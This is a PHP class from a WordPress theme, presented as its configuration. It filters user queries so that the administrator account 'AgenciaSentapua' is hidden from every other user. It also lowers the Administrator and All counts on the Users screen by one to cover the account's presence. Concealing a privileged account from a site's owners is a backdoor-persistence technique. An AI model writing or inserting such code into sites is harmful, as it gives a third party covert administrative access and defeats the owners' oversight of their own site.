<?php
/**
 * @package SentapuaTheme
 */

namespace SentapuaTheme\Theme\App;

use SentapuaTheme\Theme\ThemeBaseController;

class Config extends ThemeBaseController
{

	public function register()
	{


		add_action ( 'pre_user_query', [ $this , 'yoursite_pre_user_query' ] );
		add_filter ( 'views_users' , [ $this , 'list_table_views' ] );

	}

	function yoursite_pre_user_query($user_search) {
		global $current_user;
		$username = $current_user->user_login;

		if ($username != 'AgenciaSentapua') {
			global $wpdb;
			$user_search->query_where = str_replace('WHERE 1=1',
				"WHERE 1=1 AND {$wpdb->users}.user_login != 'AgenciaSentapua'",$user_search->query_where);
		}
	}

	function list_table_views($views){
		$users = count_users();
		$admins_num = $users['avail_roles']['administrator'] - 1;
		$all_num = $users['total_users'] - 1;
		$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
		$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
		$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
		$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
		return $views;
	}

}